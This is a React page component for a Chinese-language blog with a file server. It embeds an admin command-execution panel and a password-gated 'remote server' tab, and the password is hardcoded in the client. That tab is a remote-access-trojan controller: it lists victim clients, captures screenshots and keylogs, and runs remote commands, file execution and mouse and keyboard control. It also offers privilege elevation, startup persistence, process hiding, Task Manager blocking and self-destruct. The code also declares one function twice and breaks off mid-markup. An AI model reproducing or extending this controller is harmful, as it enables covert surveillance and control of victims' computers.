import { useState, useEffect, useRef } from 'react'

interface FileItem {
  name: string
  size: number
  size_str: string
  mtime: string
}

type ActiveTab = 'home' | 'fileServer' | 'remoteServer'

export default function Home() {
  const [activeTab, setActiveTab] = useState<ActiveTab>('home')
  const [files, setFiles] = useState<FileItem[]>([])
  const [message, setMessage] = useState('')
  const [messageType, setMessageType] = useState<'success' | 'error' | ''>('')
  const [selectedFileName, setSelectedFileName] = useState('')
  const [isAdmin, setIsAdmin] = useState(false)
  const [showLoginModal, setShowLoginModal] = useState(false)
  const [showCmdModal, setShowCmdModal] = useState(false)
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [command, setCommand] = useState('')
  const [cmdResult, setCmdResult] = useState('')
  const [currentDir, setCurrentDir] = useState('')
  const [logs, setLogs] = useState<any[]>([])
  const [logTypeFilter, setLogTypeFilter] = useState('all')
  const [showLogs, setShowLogs] = useState(false)
  const [showServerFiles, setShowServerFiles] = useState(false)
  const [serverFiles, setServerFiles] = useState<any[]>([])
  const [serverFilesPath, setServerFilesPath] = useState('.')
  const [showCreateModal, setShowCreateModal] = useState<'file' | 'directory' | null>(null)
  const [newItemName, setNewItemName] = useState('')
  const [showFileEditor, setShowFileEditor] = useState(false)
  const [editingFile, setEditingFile] = useState('')
  const [editingContent, setEditingContent] = useState('')
  const [showBlobStorage, setShowBlobStorage] = useState(false)
  const [blobFiles, setBlobFiles] = useState<any[]>([])
  
  const [remoteServerPassword, setRemoteServerPassword] = useState('')
  const [remoteServerAuthenticated, setRemoteServerAuthenticated] = useState(false)
  const [remoteServerPasswordError, setRemoteServerPasswordError] = useState('')
  
  const fileInputRef = useRef<HTMLInputElement>(null)
  const uploadAreaRef = useRef<HTMLDivElement>(null)

  const fetchFiles = async () => {
    try {
      const response = await fetch('/api/files')
      if (!response.ok) {
        console.error('Failed to fetch files:', response.status)
        setFiles([])
        return
      }
      const data = await response.json()
      if (!data || !Array.isArray(data.files)) {
        setFiles([])
        return
      }
      setFiles(data.files)
    } catch (error) {
      console.error('Failed to fetch files:', error)
      setFiles([])
    }
  }

  const checkAdminStatus = async () => {
    try {
      const response = await fetch('/api/admin/status')
      const data = await response.json()
      setIsAdmin(data.isAdmin)
    } catch (error) {
      console.error('Failed to check admin status:', error)
    }
  }

  const fetchLogs = async () => {
    try {
      const url = logTypeFilter === 'all' 
        ? '/api/admin/logs' 
        : `/api/admin/logs?type=${logTypeFilter}`
      const response = await fetch(url)
      if (!response.ok) {
        console.error('Failed to fetch logs:', response.status)
        return
      }
      const data = await response.json()
      setLogs(data.data || [])
    } catch (error) {
      console.error('Failed to fetch logs:', error)
    }
  }

  useEffect(() => {
    fetchFiles()
    checkAdminStatus()
  }, [])

  const showMessage = (text: string, type: 'success' | 'error') => {
    setMessage(text)
    setMessageType(type)
    setTimeout(() => {
      setMessage('')
      setMessageType('')
    }, 3000)
  }

  const handleFileSelect = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files.length > 0) {
      setSelectedFileName(e.target.files[0].name)
    }
  }

  const handleDragOver = (e: React.DragEvent) => {
    e.preventDefault()
    if (uploadAreaRef.current) {
      uploadAreaRef.current.style.borderColor = '#3498db'
      uploadAreaRef.current.style.backgroundColor = '#f0f5ff'
    }
  }

  const handleDragLeave = () => {
    if (uploadAreaRef.current) {
      uploadAreaRef.current.style.borderColor = '#d1d9e6'
      uploadAreaRef.current.style.backgroundColor = '#f8fafc'
    }
  }

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault()
    if (uploadAreaRef.current) {
      uploadAreaRef.current.style.borderColor = '#d1d9e6'
      uploadAreaRef.current.style.backgroundColor = '#f8fafc'
    }
    if (e.dataTransfer.files.length > 0 && fileInputRef.current) {
      fileInputRef.current.files = e.dataTransfer.files
      setSelectedFileName(e.dataTransfer.files[0].name)
    }
  }

  const handleUpload = async () => {
    if (!fileInputRef.current || !fileInputRef.current.files || fileInputRef.current.files.length === 0) {
      showMessage('请先选择文件', 'error')
      return
    }

    const formData = new FormData()
    formData.append('file', fileInputRef.current.files[0])

    try {
      const response = await fetch('/api/upload', {
        method: 'POST',
        body: formData,
      })
      
      let result
      try {
        result = await response.json()
      } catch {
        showMessage('上传失败，服务器返回无效响应', 'error')
        return
      }
      
      if (!response.ok) {
        const errorMsg = result?.details ? `${result.message}: ${result.details}` : result?.message || `上传失败，状态码: ${response.status}`
        showMessage(errorMsg, 'error')
        return
      }
      
      if (!result || typeof result.status !== 'string' || typeof result.message !== 'string') {
        showMessage('上传失败，响应格式错误', 'error')
        return
      }
      
      const successMsg = result.filename ? `${result.message} - ${result.filename}` : result.message
      showMessage(successMsg, result.status === 'success' ? 'success' : 'error')
      
      if (result.status === 'success') {
        setSelectedFileName('')
        if (fileInputRef.current) {
          fileInputRef.current.value = ''
        }
        fetchFiles()
      }
    } catch (error) {
      showMessage('上传失败，请重试', 'error')
    }
  }

  const handleLogin = async () => {
    try {
      const response = await fetch('/api/admin/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password }),
      })
      const result = await response.json()
      showMessage(result.message, result.status === 'success' ? 'success' : 'error')
      if (result.status === 'success') {
        setIsAdmin(true)
        setShowLoginModal(false)
        setUsername('')
        setPassword('')
      }
    } catch (error) {
      showMessage('登录失败', 'error')
    }
  }

  const handleLogout = async () => {
    try {
      const response = await fetch('/api/admin/logout', {
        method: 'POST',
      })
      const result = await response.json()
      showMessage(result.message, result.status === 'success' ? 'success' : 'error')
      if (result.status === 'success') {
        setIsAdmin(false)
      }
    } catch (error) {
      showMessage('退出失败', 'error')
    }
  }

  const handleDeleteFile = async (filename: string) => {
    if (!confirm(`确定要删除文件 "${filename}" 吗？`)) {
      return
    }
    try {
      const response = await fetch('/api/admin/delete', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ filename }),
      })
      const result = await response.json()
      showMessage(result.message, result.status === 'success' ? 'success' : 'error')
      if (result.status === 'success') {
        fetchFiles()
      }
    } catch (error) {
      showMessage('删除失败', 'error')
    }
  }

  const fetchServerFiles = async (dir?: string) => {
    try {
      const url = dir ? `/api/admin/serverFiles?dir=${encodeURIComponent(dir)}` : '/api/admin/serverFiles'
      const response = await fetch(url)
      const result = await response.json()
      if (result.status === 'success') {
        setServerFiles(result.files)
        setServerFilesPath(result.relativePath || '.')
      }
    } catch (error) {
      showMessage('获取服务器文件失败', 'error')
    }
  }

  const navigateToServerDir = (dir: string) => {
    fetchServerFiles(dir)
  }

  const goToParentDir = () => {
    if (serverFilesPath === '.') return;
    
    const pathParts = serverFilesPath.split('/');
    pathParts.pop();
    const parentPath = pathParts.join('/') || '.';
    fetchServerFiles(parentPath);
  }

  const openFileEditor = async (filePath: string) => {
    try {
      const response = await fetch(`/api/admin/fileContent?filePath=${encodeURIComponent(filePath)}`);
      const result = await response.json();
      if (result.status === 'success') {
        setEditingFile(filePath);
        setEditingContent(result.content);
        setShowFileEditor(true);
      } else {
        showMessage(result.message, 'error');
      }
    } catch (error) {
      showMessage('打开文件失败', 'error');
    }
  }

  const saveFile = async () => {
    try {
      const response = await fetch(`/api/admin/fileContent?filePath=${encodeURIComponent(editingFile)}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: editingContent }),
      });
      const result = await response.json();
      showMessage(result.message, result.status === 'success' ? 'success' : 'error');
      if (result.status === 'success') {
        setShowFileEditor(false);
        fetchServerFiles(serverFilesPath);
      }
    } catch (error) {
      showMessage('保存文件失败', 'error');
    }
  }

  const createNewItem = async () => {
    if (!newItemName.trim()) {
      showMessage('请输入名称', 'error');
      return;
    }

    try {
      const response = await fetch('/api/admin/createItem', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: showCreateModal,
          name: newItemName,
          parentDir: serverFilesPath === '.' ? '' : serverFilesPath,
        }),
      });
      const result = await response.json();
      showMessage(result.message, result.status === 'success' ? 'success' : 'error');
      if (result.status === 'success') {
        setShowCreateModal(null);
        setNewItemName('');
        fetchServerFiles(serverFilesPath);
      }
    } catch (error) {
      showMessage('创建失败', 'error');
    }
  }

  const fetchBlobStorage = async () => {
    try {
      const response = await fetch('/api/admin/blobStorage');
      const result = await response.json();
      if (result.status === 'success') {
        setBlobFiles(result.files);
      }
    } catch (error) {
      showMessage('获取Blob存储失败', 'error');
    }
  }

  const handleExecuteCommand = async () => {
    if (!command.trim()) {
      showMessage('请输入命令', 'error')
      return
    }
    try {
      const response = await fetch('/api/admin/cmd', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command }),
      })
      const result = await response.json()
      
      if (result.cwd) {
        setCurrentDir(result.cwd)
      }
      
      let output = ''
      if (result.stdout) output += `标准输出:\n${result.stdout}\n\n`
      if (result.stderr) output += `错误输出:\n${result.stderr}`
      setCmdResult(output || result.message)
      showMessage(result.message, result.status === 'success' ? 'success' : 'error')
    } catch (error) {
      showMessage('命令执行失败', 'error')
    }
  }

  const formatSize = (bytes: number): string => {
    if (bytes < 1024) return `${bytes} B`
    if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(2)} KB`
    return `${(bytes / (1024 * 1024)).toFixed(2)} MB`
  }

  const handleRemoteServerLogin = () => {
    if (remoteServerPassword === 'rhjz') {
      setRemoteServerAuthenticated(true)
      setRemoteServerPasswordError('')
    } else {
      setRemoteServerPasswordError('密码错误，请输入正确的密码')
    }
  }

  const handleRemoteServerLogout = () => {
    setRemoteServerAuthenticated(false)
    setRemoteServerPassword('')
    setRemoteServerPasswordError('')
  }

  const renderHomeTab = () => (
    <div className="home-content">
      <div className="hero-section">
        <h2>欢迎来到君卓博客</h2>
        <p>探索更多功能和服务</p>
      </div>
      
      <div className="features-grid">
        <div className="feature-card" onClick={() => setActiveTab('fileServer')}>
          <div className="feature-icon">
            <i className="fas fa-cloud-upload-alt"></i>
          </div>
          <h3>文件上传下载服务器</h3>
          <p>安全、便捷的文件管理服务</p>
        </div>
        
        <div className="feature-card" onClick={() => setActiveTab('remoteServer')}>
          <div className="feature-icon">
            <i className="fas fa-server"></i>
          </div>
          <h3>远程服务端</h3>
          <p>受密码保护的远程管理服务</p>
        </div>
      </div>

      {isAdmin && (
        <div className="admin-section">
          <h3>管理员功能</h3>
          <div className="admin-cards">
            <div className="admin-card" onClick={() => { setActiveTab('fileServer'); setShowLogs(true); fetchLogs(); }}>
              <i className="fas fa-file-alt"></i>
              <span>系统日志</span>
            </div>
            <div className="admin-card" onClick={() => { setActiveTab('fileServer'); setShowServerFiles(true); fetchServerFiles(); }}>
              <i className="fas fa-folder-open"></i>
              <span>服务器文件</span>
            </div>
            <div className="admin-card" onClick={() => { setActiveTab('fileServer'); setShowBlobStorage(true); fetchBlobStorage(); }}>
              <i className="fas fa-cloud"></i>
              <span>Blob存储</span>
            </div>
            <div className="admin-card" onClick={() => setShowCmdModal(true)}>
              <i className="fas fa-terminal"></i>
              <span>命令执行</span>
            </div>
          </div>
        </div>
      )}
    </div>
  )

  const renderFileServerTab = () => (
    <div className="file-server-content">
      <div className="main-content">
        <div className="card">
          <h2>
            <i className="fas fa-cloud-upload-alt"></i> 文件上传
          </h2>
          <div
            ref={uploadAreaRef}
            className="upload-area"
            onClick={() => fileInputRef.current?.click()}
            onDragOver={handleDragOver}
            onDragLeave={handleDragLeave}
            onDrop={handleDrop}
          >
            <div className="upload-icon">
              <i className="fas fa-file"></i>
            </div>
            <div className="upload-text">
              <h3>点击或拖放文件到此处</h3>
              <p>支持任意格式文件上传</p>
              {selectedFileName && (
                <p style={{ color: '#3498db', fontWeight: '500', marginTop: '0.5rem' }}>
                  已选择: {selectedFileName}
                </p>
              )}
            </div>
            <input
              ref={fileInputRef}
              type="file"
              id="file-input"
              accept="*"
              onChange={handleFileSelect}
            />
          </div>
          <button className="btn btn-upload" onClick={handleUpload}>
            <i className="fas fa-upload"></i> 上传文件
          </button>
          {message && <div className={`message ${messageType}`}>{message}</div>}
        </div>

        <div className="card">
          <h2>
            <i className="fas fa-cloud-download-alt"></i> 文件下载
          </h2>
          <p>可下载的文件列表：</p>
          <div className="file-list">
            {files.length > 0 ? (
              files.map((file, index) => (
                <div key={`${file.name}-${index}`} className="file-item">
                  <div className="file-info">
                    <div className="file-icon">
                      <i className="fas fa-file-alt"></i>
                    </div>
                    <div className="file-details">
                      <h4>{file.name}</h4>
                      <div className="file-meta">
                        <span>
                          <i className="fas fa-clock"></i> {file.mtime}
                        </span>
                        <span>
                          <i className="fas fa-hdd"></i> {formatSize(file.size)}
                        </span>
                      </div>
                    </div>
                  </div>
                  <div style={{ display: 'flex', gap: '0.5rem' }}>
                    <a href={`/api/download/${encodeURIComponent(file.name)}`} className="btn">
                      <i className="fas fa-download"></i> 下载
                    </a>
                    {isAdmin && (
                      <button 
                        className="btn" 
                        onClick={() => handleDeleteFile(file.name)}
                        style={{ background: '#e74c3c' }}
                      >
                        <i className="fas fa-trash"></i> 删除
                      </button>
                    )}
                  </div>
                </div>
              ))
            ) : (
              <p style={{ textAlign: 'center', padding: '2rem', color: '#666' }}>
                <i className="fas fa-folder-open" style={{ fontSize: '2rem', display: 'block', marginBottom: '1rem' }}></i>
                暂无可用文件
              </p>
            )}
          </div>
        </div>
      </div>

      {isAdmin && (
        <div style={{ display: 'flex', flexDirection: 'column', gap: '2rem' }}>
          <div className="card">
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <h2>
                <i className="fas fa-file-alt"></i> 系统日志
              </h2>
              <button 
                className="btn" 
                onClick={() => { 
                  setShowLogs(!showLogs); 
                  if (!showLogs) fetchLogs(); 
                }}
                style={{ background: showLogs ? '#666' : '#3498db' }}
              >
                <i className="fas fa-eye"></i> {showLogs ? '隐藏日志' : '查看日志'}
              </button>
            </div>
            
            {showLogs && (
              <div style={{ marginTop: '1rem' }}>
                <div style={{ display: 'flex', gap: '0.5rem', marginBottom: '1rem', flexWrap: 'wrap' }}>
                  {['all', 'access', 'upload', 'download', 'login', 'logout', 'command', 'error', 'system'].map((type) => (
                    <button
                      key={type}
                      className="btn"
                      onClick={() => { setLogTypeFilter(type); fetchLogs(); }}
                      style={{ 
                        background: logTypeFilter === type ? '#3498db' : '#95a5a6',
                        padding: '0.3rem 0.8rem',
                        fontSize: '0.8rem'
                      }}
                    >
                      {type === 'all' ? '全部' : 
                       type === 'access' ? '访问' :
                       type === 'upload' ? '上传' :
                       type === 'download' ? '下载' :
                       type === 'login' ? '登录' :
                       type === 'logout' ? '退出' :
                       type === 'command' ? '命令' :
                       type === 'error' ? '错误' : '系统'}
                    </button>
                  ))}
                </div>
                
                <div style={{ 
                  background: '#f8f9fa', 
                  padding: '1rem', 
                  borderRadius: '6px', 
                  maxHeight: '400px',
                  overflowY: 'auto',
                  fontFamily: 'monospace',
                  fontSize: '0.9rem'
                }}>
                  {logs.length > 0 ? (
                    <div>
                      {logs.map((log) => {
                        const date = new Date(log.timestamp)
                        const formattedDate = date.toLocaleString('zh-CN')
                        const typeColors: Record<string, string> = {
                          access: '#3498db',
                          upload: '#2ecc71',
                          download: '#3498db',
                          login: '#f39c12',
                          logout: '#9b59b6',
                          command: '#1abc9c',
                          error: '#e74c3c',
                          system: '#95a5a6'
                        }
                        return (
                          <div key={log.id} style={{ 
                            padding: '0.5rem', 
                            borderBottom: '1px solid #e9ecef',
                            display: 'flex',
                            gap: '1rem'
                          }}>
                            <span style={{ color: '#666', whiteSpace: 'nowrap' }}>[{formattedDate}]</span>
                            <span style={{ color: typeColors[log.type] || '#333', whiteSpace: 'nowrap' }}>[{log.type === 'access' ? '访问' :
                               log.type === 'upload' ? '上传' :
                               log.type === 'download' ? '下载' :
                               log.type === 'login' ? '登录' :
                               log.type === 'logout' ? '退出' :
                               log.type === 'command' ? '命令' :
                               log.type === 'error' ? '错误' : '系统'}]</span>
                            <span style={{ color: '#888', whiteSpace: 'nowrap' }}>{log.ip}</span>
                            <span style={{ fontWeight: '500' }}>{log.action}</span>
                            <span>{log.details}</span>
                            {log.username && <span style={{ color: '#9b59b6' }}>(用户: {log.username})</span>}
                          </div>
                        )
                      })}
                    </div>
                  ) : (
                    <p style={{ textAlign: 'center', color: '#666' }}>暂无日志记录</p>
                  )}
                </div>
              </div>
            )}
          </div>

          <div className="card">
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <h2>
                <i className="fas fa-server"></i> 服务器文件浏览
              </h2>
              <button 
                className="btn" 
                onClick={() => { 
                  setShowServerFiles(!showServerFiles); 
                  if (!showServerFiles) fetchServerFiles(); 
                }}
                style={{ background: showServerFiles ? '#666' : '#3498db' }}
              >
                <i className="fas fa-folder-open"></i> {showServerFiles ? '隐藏' : '浏览文件'}
              </button>
            </div>
            
            {showServerFiles && (
              <div style={{ marginTop: '1rem' }}>
                <div style={{ marginBottom: '1rem', display: 'flex', alignItems: 'center', gap: '1rem', flexWrap: 'wrap' }}>
                  <span style={{ color: '#666', fontSize: '0.9rem' }}>当前路径:</span>
                  <span style={{ marginLeft: '0.5rem', fontFamily: 'monospace' }}>{serverFilesPath}</span>
                  {serverFilesPath !== '.' && (
                    <button 
                      className="btn" 
                      onClick={() => goToParentDir()}
                      style={{ background: '#95a5a6', padding: '0.3rem 0.8rem', fontSize: '0.8rem' }}
                    >
                      <i className="fas fa-arrow-up"></i> 返回上级
                    </button>
                  )}
                  <button 
                    className="btn" 
                    onClick={() => setShowCreateModal('file')}
                    style={{ background: '#2ecc71', padding: '0.3rem 0.8rem', fontSize: '0.8rem' }}
                  >
                    <i className="fas fa-file-plus"></i> 新建文件
                  </button>
                  <button 
                    className="btn" 
                    onClick={() => setShowCreateModal('directory')}
                    style={{ background: '#f39c12', padding: '0.3rem 0.8rem', fontSize: '0.8rem' }}
                  >
                    <i className="fas fa-folder-plus"></i> 新建目录
                  </button>
                </div>
                
                <div style={{ 
                  background: '#f8f9fa', 
                  padding: '1rem', 
                  borderRadius: '6px', 
                  maxHeight: '400px',
                  overflowY: 'auto'
                }}>
                  {serverFiles.length > 0 ? (
                    <div>
                      {serverFiles.map((file) => (
                        <div 
                          key={file.path} 
                          style={{ 
                            padding: '0.5rem', 
                            borderBottom: '1px solid #e9ecef',
                            display: 'flex',
                            justifyContent: 'space-between',
                            alignItems: 'center',
                            cursor: file.type === 'directory' ? 'pointer' : 'pointer'
                          }}
                          onClick={() => file.type === 'directory' && navigateToServerDir(file.path)}
                          onDoubleClick={() => file.type === 'file' && openFileEditor(file.path)}
                        >
                          <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                            <i className={`fas ${file.type === 'directory' ? 'fa-folder' : 'fa-file'}`} 
                               style={{ color: file.type === 'directory' ? '#f39c12' : '#3498db' }}></i>
                            <span>{file.name}</span>
                            {file.type === 'file' && (
                              <span style={{ color: '#95a5a6', fontSize: '0.8rem' }}>(双击编辑)</span>
                            )}
                          </div>
                          <div style={{ display: 'flex', gap: '1rem', fontSize: '0.8rem', color: '#666' }}>
                            {file.size !== undefined && <span>{formatSize(file.size)}</span>}
                            {file.mtime && <span>{file.mtime}</span>}
                          </div>
                        </div>
                      ))}
                    </div>
                  ) : (
                    <p style={{ textAlign: 'center', color: '#666' }}>目录为空</p>
                  )}
                </div>
              </div>
            )}
          </div>

          <div className="card">
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <h2>
                <i className="fas fa-cloud"></i> Vercel Blob存储查看
              </h2>
              <button 
                className="btn" 
                onClick={() => { 
                  setShowBlobStorage(!showBlobStorage); 
                  if (!showBlobStorage) fetchBlobStorage(); 
                }}
                style={{ background: showBlobStorage ? '#666' : '#3498db' }}
              >
                <i className="fas fa-eye"></i> {showBlobStorage ? '隐藏' : '查看存储'}
              </button>
            </div>
            
            {showBlobStorage && (
              <div style={{ marginTop: '1rem' }}>
                <div style={{ 
                  background: '#f8f9fa', 
                  padding: '1rem', 
                  borderRadius: '6px', 
                  maxHeight: '400px',
                  overflowY: 'auto'
                }}>
                  {blobFiles.length > 0 ? (
                    <div>
                      {blobFiles.map((file, index) => (
                        <div 
                          key={`${file.name}-${index}`} 
                          style={{ 
                            padding: '0.5rem', 
                            borderBottom: '1px solid #e9ecef',
                            display: 'flex',
                            justifyContent: 'space-between',
                            alignItems: 'center'
                          }}
                        >
                          <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                            <i className={`fas ${file.type === 'directory' ? 'fa-folder' : 'fa-file'}`} 
                               style={{ color: file.type === 'directory' ? '#f39c12' : '#3498db' }}></i>
                            <span>{file.name}</span>
                          </div>
                          <div style={{ display: 'flex', gap: '1rem', fontSize: '0.8rem', color: '#666' }}>
                            {file.size_str && <span>{file.size_str}</span>}
                            {file.mtime && <span>{file.mtime}</span>}
                          </div>
                        </div>
                      ))}
                    </div>
                  ) : (
                    <p style={{ textAlign: 'center', color: '#666' }}>存储为空</p>
                  )}
                </div>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  )

  const [clients, setClients] = useState<any[]>([])
  const [selectedClient, setSelectedClient] = useState<any>(null)
  const [screenshotUrl, setScreenshotUrl] = useState('')
  const [screenViewActive, setScreenViewActive] = useState(false)
  const [directoryItems, setDirectoryItems] = useState<any[]>([])
  const [currentPath, setCurrentPath] = useState('.')
  const [processes, setProcesses] = useState<any[]>([])
  const [keylogContent, setKeylogContent] = useState('')
  const [remoteCommand, setRemoteCommand] = useState('')
  const [commandResult, setCommandResult] = useState('')
  const [commandType, setCommandType] = useState('cmd')
  const [downloadProgress, setDownloadProgress] = useState('')
  const [uploadFileName, setUploadFileName] = useState('')

  const fetchClients = async () => {
    try {
      const response = await fetch('/api/admin/clients?action=list')
      const result = await response.json()
      if (result.status === 'success') {
        setClients(result.clients)
      }
    } catch (error) {
      console.error('获取客户端列表失败:', error)
    }
  }

  const fetchScreenshot = async (clientId: string) => {
    try {
      const response = await fetch(`/api/admin/clients?action=screenshot&id=${clientId}`)
      const result = await response.json()
      if (result.status === 'success' && result.url) {
        setScreenshotUrl(result.url + '?' + Date.now())
      }
    } catch (error) {
      console.error('获取截图失败:', error)
    }
  }

  const sendRemoteCommand = async (clientId: string, command: string, type: string) => {
    try {
      const response = await fetch(`/api/admin/remote?action=sendCommand&clientId=${clientId}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command, type })
      })
      const result = await response.json()
      
      if (result.status === 'success') {
        setTimeout(() => getCommandResult(clientId, result.commandId), 2000)
        showMessage('命令已发送', 'success')
      }
    } catch (error) {
      showMessage('命令发送失败', 'error')
    }
  }

  const getCommandResult = async (clientId: string, commandId: string) => {
    try {
      const response = await fetch(`/api/admin/remote?action=getResult&clientId=${clientId}&commandId=${commandId}`)
      const result = await response.json()
      if (result.status === 'success' && result.result) {
        setCommandResult(result.result.output || result.result.message || '')
      }
    } catch (error) {
      console.error('获取命令结果失败:', error)
    }
  }

  const getClientDirectory = async (clientId: string, path: string = '.') => {
    try {
      await sendRemoteCommand(clientId, path, 'directory')
      setTimeout(async () => {
        const response = await fetch(`/api/admin/clients?action=info&id=${clientId}`)
        const result = await response.json()
        if (result.status === 'success') {
          const cmdResponse = await fetch(`/api/admin/remote?action=getResult&clientId=${clientId}`)
          const cmdResult = await cmdResponse.json()
          if (cmdResult.result) {
            try {
              const data = JSON.parse(cmdResult.result.output)
              if (data.items) {
                setDirectoryItems(data.items)
                setCurrentPath(path)
              }
            } catch {
              setDirectoryItems([])
            }
          }
        }
      }, 1500)
    } catch (error) {
      console.error('获取目录失败:', error)
    }
  }

  const navigateToParentDirectory = () => {
    if (currentPath === '.' || currentPath === '/' || !currentPath.includes('\\')) {
      getClientDirectory(selectedClient?.id || '', '.')
      return
    }
    const parentPath = currentPath.split('\\').slice(0, -1).join('\\') || '.'
    getClientDirectory(selectedClient?.id || '', parentPath)
  }

  const renderPathBreadcrumbs = () => {
    if (currentPath === '.') {
      return <span className="path-link">当前目录</span>
    }
    const parts = currentPath.split('\\')
    let pathAccum = ''
    return parts.map((part, index) => {
      pathAccum = index === 0 ? part : `${pathAccum}\\${part}`
      const isLast = index === parts.length - 1
      return (
        <span key={index}>
          {index > 0 && <span className="path-separator">\\</span>}
          {!isLast ? (
            <button 
              className="path-link"
              onClick={() => getClientDirectory(selectedClient?.id || '', pathAccum)}
            >
              {part}
            </button>
          ) : (
            <span className="path-link active">{part}</span>
          )}
        </span>
      )
    })
  }

  const handleDeleteFile = async (clientId: string, filePath: string) => {
    if (!confirm(`确定要删除文件 "${filePath}" 吗？此操作不可恢复！`)) return
    try {
      await sendRemoteCommand(clientId, filePath, 'delete')
      setTimeout(async () => {
        const response = await fetch(`/api/admin/remote?action=getResult&clientId=${clientId}`)
        const result = await response.json()
        if (result.status === 'success' && result.result) {
          showMessage(result.result.output || '文件删除成功', 'success')
          getClientDirectory(clientId, currentPath)
        } else {
          showMessage('删除失败', 'error')
        }
      }, 1000)
    } catch (error) {
      showMessage('删除失败', 'error')
    }
  }

  const getClientProcesses = async (clientId: string) => {
    try {
      await sendRemoteCommand(clientId, '', 'processes')
      setTimeout(async () => {
        const response = await fetch(`/api/admin/remote?action=getResult&clientId=${clientId}`)
        const result = await response.json()
        if (result.status === 'success' && result.result) {
          try {
            const data = JSON.parse(result.result.output)
            if (data.processes) {
              setProcesses(data.processes)
            }
          } catch {
            setProcesses([])
          }
        }
      }, 2000)
    } catch (error) {
      console.error('获取进程失败:', error)
    }
  }

  const killClientProcess = async (clientId: string, pid: number) => {
    await sendRemoteCommand(clientId, pid.toString(), 'kill')
    setTimeout(() => getClientProcesses(clientId), 1000)
  }

  const startScreenView = async (clientId: string) => {
    setScreenViewActive(true)
    const fetchScreen = async () => {
      if (!screenViewActive) return
      await fetchScreenshot(clientId)
      setTimeout(fetchScreen, 3000)
    }
    fetchScreen()
  }

  const stopScreenView = () => {
    setScreenViewActive(false)
  }

  const handleMouseControl = (clientId: string, x: number, y: number, action: string) => {
    sendRemoteCommand(clientId, `${x}|${y}|${action}`, 'mouse')
  }

  const handleKeyboardControl = (clientId: string, key: string, action: string) => {
    sendRemoteCommand(clientId, `${key}|${action}`, 'keyboard')
  }

  const handleRemoteCmd = () => {
    if (selectedClient && remoteCommand) {
      sendRemoteCommand(selectedClient.id, remoteCommand, commandType)
      setTimeout(async () => {
        const response = await fetch(`/api/admin/remote?action=getResult&clientId=${selectedClient.id}`)
        const result = await response.json()
        if (result.status === 'success' && result.result) {
          setCommandResult(result.result.output || result.result.message || '')
        }
      }, 3000)
    }
  }

  const handleDownloadFile = (clientId: string, filePath: string) => {
    sendRemoteCommand(clientId, filePath, 'download')
    setDownloadProgress(`正在下载: ${filePath}`)
    setTimeout(() => setDownloadProgress(''), 3000)
  }

  const handleExecuteFile = (clientId: string, filePath: string) => {
    sendRemoteCommand(clientId, filePath, 'execute')
    showMessage('文件已执行', 'success')
  }

  const handleElevate = (clientId: string) => {
    sendRemoteCommand(clientId, '', 'elevate')
    showMessage('已请求提权', 'success')
  }

  const handleAddStartup = (clientId: string) => {
    sendRemoteCommand(clientId, '', 'startup')
    showMessage('已添加到开机启动', 'success')
  }

  const handleHideProcess = (clientId: string) => {
    sendRemoteCommand(clientId, '', 'hide')
    showMessage('进程已隐藏', 'success')
  }

  const handleBlockTaskMgr = (clientId: string) => {
    sendRemoteCommand(clientId, '', 'block_taskmgr')
    showMessage('任务管理器已禁用', 'success')
  }

  const handleSelfDestruct = (clientId: string) => {
    if (!confirm('确定要让客户端自毁吗？此操作不可恢复！')) return
    sendRemoteCommand(clientId, '', 'selfdestruct')
    showMessage('客户端已自毁', 'success')
    setTimeout(() => fetchClients(), 1000)
  }

  const handleRemoveClient = async (clientId: string, hostname: string) => {
    if (!confirm(`确定要删除客户端 "${hostname}" 吗？此操作将从服务端移除该客户端记录，但不会影响客户端本身。`)) return
    try {
      const response = await fetch(`/api/admin/clients?action=remove&id=${clientId}`)
      const result = await response.json()
      if (result.status === 'success') {
        showMessage('客户端已删除', 'success')
        if (selectedClient?.id === clientId) {
          setSelectedClient(null)
        }
        fetchClients()
      } else {
        showMessage('删除失败', 'error')
      }
    } catch (error) {
      showMessage('删除失败', 'error')
    }
  }

  const renderRemoteServerTab = () => (
    <div className="remote-server-content">
      {!remoteServerAuthenticated ? (
        <div className="auth-container">
          <div className="auth-card">
            <h2>
              <i className="fas fa-lock"></i> 远程服务端
            </h2>
            <p>请输入密码以访问远程服务端</p>
            <div style={{ marginBottom: '1.5rem' }}>
              <label style={{ display: 'block', marginBottom: '0.5rem', color: '#333' }}>密码</label>
              <input
                type="password"
                value={remoteServerPassword}
                onChange={(e) => setRemoteServerPassword(e.target.value)}
                placeholder="请输入密码"
                style={{ width: '100%', padding: '0.8rem', borderRadius: '6px', border: '1px solid #ddd' }}
                onKeyPress={(e) => e.key === 'Enter' && handleRemoteServerLogin()}
              />
              {remoteServerPasswordError && (
                <p style={{ color: '#e74c3c', fontSize: '0.85rem', marginTop: '0.5rem' }}>
                  {remoteServerPasswordError}
                </p>
              )}
            </div>
            <button 
              className="btn btn-upload" 
              onClick={handleRemoteServerLogin}
              style={{ width: '100%' }}
            >
              <i className="fas fa-unlock"></i> 登录
            </button>
          </div>
        </div>
      ) : (
        <div className="remote-server-dashboard">
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '2rem', flexWrap: 'wrap', gap: '1rem' }}>
            <h2>
              <i className="fas fa-server"></i> 远程服务端
            </h2>
            <div style={{ display: 'flex', gap: '1rem' }}>
              <button 
                className="btn" 
                onClick={fetchClients}
                style={{ background: '#3498db' }}
              >
                <i className="fas fa-refresh"></i> 刷新客户端
              </button>
              <button 
